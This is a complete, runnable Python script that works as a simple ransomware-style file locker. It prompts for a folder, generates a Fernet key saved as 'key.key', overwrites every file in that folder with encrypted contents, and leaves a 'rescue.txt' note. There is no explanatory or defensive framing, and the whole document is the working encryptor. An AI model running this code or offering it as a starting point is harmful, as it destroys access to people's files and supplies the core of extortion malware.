from cryptography.fernet import Fernet
import os
from shared import get_path_mode_on_so


def set_path():
    return input("Specify the folder to encrypt:")


def generate_key():
    _key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(_key)


def load_key():
    return open('key.key', 'rb').read()


def encrypt(_items, _key):
    f = Fernet(_key)
    for item in _items:
        with open(item, 'rb') as _file:
            file_data = _file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as _file:
            _file.write(encrypted_data)


if __name__ == '__main__':
    path_to_encrypt = set_path()
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt + get_path_mode_on_so() + item for item in items]

    generate_key()
    key = load_key()
    encrypt(full_path, key)

    with open(path_to_encrypt + get_path_mode_on_so() + 'rescue.txt', 'w') as file:
        file.write('Encrypted information')
